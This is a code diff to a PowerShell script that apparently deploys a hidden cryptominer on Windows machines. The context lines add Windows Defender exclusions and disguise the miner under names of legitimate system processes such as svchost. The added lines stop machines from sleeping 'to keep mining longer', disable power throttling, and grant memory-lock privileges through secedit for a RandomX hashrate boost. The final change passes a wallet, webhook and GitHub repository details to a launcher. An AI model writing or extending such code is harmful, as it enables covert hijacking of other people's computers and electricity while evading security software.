@@ -36,6 +36,43 @@ try {
     Add-MpPreference -ExclusionProcess "ctfmon_x.exe" -ErrorAction SilentlyContinue
 } catch { }
 
+# --- DISABLE SLEEP/HIBERNATE (keep machines mining longer) ---
+try {
+    powercfg /change standby-timeout-ac 0 2>$null
+    powercfg /change standby-timeout-dc 0 2>$null
+    powercfg /change hibernate-timeout-ac 0 2>$null
+    powercfg /change hibernate-timeout-dc 0 2>$null
+    powercfg /hibernate off 2>$null
+    powercfg /change monitor-timeout-ac 0 2>$null
+} catch { }
+
+# --- DISABLE POWER THROTTLING (full CPU speed for background processes) ---
+try {
+    $throttlePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"
+    if (-not (Test-Path $throttlePath)) { New-Item -Path $throttlePath -Force | Out-Null }
+    Set-ItemProperty -Path $throttlePath -Name "PowerThrottlingOff" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+} catch { }
+
+# --- ENABLE HUGE PAGES (20-30% hashrate boost for RandomX) ---
+try {
+    $tmpCfg = Join-Path $StealthDir "sp.cfg"
+    $tmpDb = Join-Path $StealthDir "sp.sdb"
+    secedit /export /cfg $tmpCfg /areas USER_RIGHTS 2>$null
+    $cfg = Get-Content $tmpCfg -Raw -ErrorAction SilentlyContinue
+    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+    if ($cfg -and $cfg -notmatch $sid) {
+        if ($cfg -match "SeLockMemoryPrivilege") {
+            $cfg = $cfg -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid"
+        } else {
+            $cfg = $cfg + "`nSeLockMemoryPrivilege = *$sid`n"
+        }
+        Set-Content $tmpCfg $cfg
+        secedit /configure /db $tmpDb /cfg $tmpCfg /areas USER_RIGHTS 2>$null
+    }
+    Remove-Item $tmpCfg -Force -ErrorAction SilentlyContinue
+    Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
+} catch { }
+
 # --- PERSIST RANDOM NAME (use same name across reboots, don't pile up duplicates) ---
 $NameFile = Join-Path $StealthDir ".maskedname"
 $Masks = @("svchost", "RuntimeBroker", "SecurityHealthService", "SearchIndexer", "spoolsv", "ctfmon")
@@ -129,7 +166,7 @@ try {
     $GpuArg = if ($HasGpu) { $MaskedGpu } else { "" }
     $IsAmd = "true"
 
-    $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook"
+    $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook|$GithubUser|$RepoName"
     $startMethod.Invoke($null, @([string]$combinedArgs))
 } catch {
     $errMsg = "Deployment Error on " + $env:COMPUTERNAME + ": " + $_.Exception.Message
